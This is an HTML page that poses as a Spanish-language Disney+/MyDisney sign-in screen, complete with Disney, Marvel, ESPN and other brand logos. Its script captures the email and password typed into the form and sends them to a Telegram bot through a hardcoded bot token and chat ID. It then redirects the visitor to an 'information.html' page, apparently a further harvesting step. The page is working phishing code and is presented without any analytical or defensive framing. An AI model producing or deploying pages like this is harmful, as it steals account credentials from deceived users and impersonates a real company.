<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión | Disney+</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body class="page-form">
  <main>
    <!-- Logo MyDisney en haut de la carte -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo" style="width:160px; margin-bottom:24px;"/>

    <h1 style="color:#0077ff; margin-bottom:16px;">Iniciar sesión</h1>
    <p style="color:#333; margin-bottom:24px;">
      Introduce tu correo electrónico y contraseña para continuar.
    </p>

    <form id="loginForm">
      <input type="email" placeholder="Correo electrónico" required/>
      <input type="password" placeholder="Contraseña" required/>
      <button type="submit">Acceder</button>
    </form>

    <!-- Note de bas de page et logos -->
    <div class="footer-note" style="margin-top:24px; text-align:left;">
      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
      <div class="logos-container" style="margin-top:12px;">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <!-- Script Telegram et redirection -->
  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const email = this.querySelector('input[type="email"]').value.trim();
      const pwd   = this.querySelector('input[type="password"]').value.trim();
      const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chat  = "-4970333928";
      const msg   = `🔐 Inicio de sesión Disney+:\nUsuario: ${email}\nContraseña: ${pwd}`;

      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat, text: msg })
      }).catch(console.error)
        .finally(() => setTimeout(() => location.href = "information.html", 2500));
    });
  </script>
</body>
</html>
